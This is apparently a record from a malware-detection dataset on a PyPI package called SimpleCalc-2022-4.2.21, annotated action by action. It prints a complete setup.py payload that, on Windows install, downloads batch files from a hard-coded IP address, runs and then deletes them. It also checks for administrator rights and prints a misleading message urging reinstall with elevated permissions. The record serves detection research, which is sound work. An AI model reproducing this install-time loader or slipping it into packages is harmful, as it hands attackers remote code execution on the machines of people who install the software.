{
  "metadata": {
    "package_name": "SimpleCalc-2022-4.2.21",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/SimpleCalc-2022-4.2.21.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/SimpleCalc-2022-4.2.21.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "if os.name == 'nt':\n  import base64\n  from time import sleep\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # try:\n    #   subprocess.Popen(\"cmd /c break>local.bat:Zone.Identifier\", shell=True, stdin=subprocess.PIPE,\n    #                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # except:\n    #   pass\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass",
          "triple_sequences": [
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "echo %temp%",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Collect temporary directory path",
              "intention_id": "collect_temp_directory_path"
            },
            {
              "action_api": "a.stdout.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "str.strip()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "out",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Change working directory to temporary directory",
              "intention_id": "change_working_directory_temp"
            },
            {
              "action_api": "subprocess.check_call()",
              "action_description": "Configures and initiates Python package installation",
              "action_id": "configure_package_install",
              "object": "[sys.executable, '-m', 'pip', 'install', 'requests']",
              "object_description": "Python command",
              "object_id": "python_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "5",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "http://52.14.229.35:1122/connect-CANDC.txt",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "local_copy.txt",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "data.content",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cmd /c move local_copy.txt local.bat",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cmd /c local.bat",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cmd /c del local.bat",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net session",
              "object_description": "Network command string (e.g., ipconfig, netstat)",
              "object_id": "network_command",
              "intention_description": "Check admin privileges",
              "intention_id": "check_admin_privileges"
            },
            {
              "action_api": "a.stderr.read()",
              "action_description": "Reads all bytes from process standard error",
              "action_id": "read_process_stderr",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access command error output",
              "intention_id": "access_command_error_output"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "http://52.14.229.35:1122/shoomsha.jpg",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "local_b.txt",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "data.content",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cmd /c move local_b.txt loc.bat",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cmd /c loc.bat",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cmd /c del loc.bat",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            }
          ]
        }
      ]
    }
  ]
}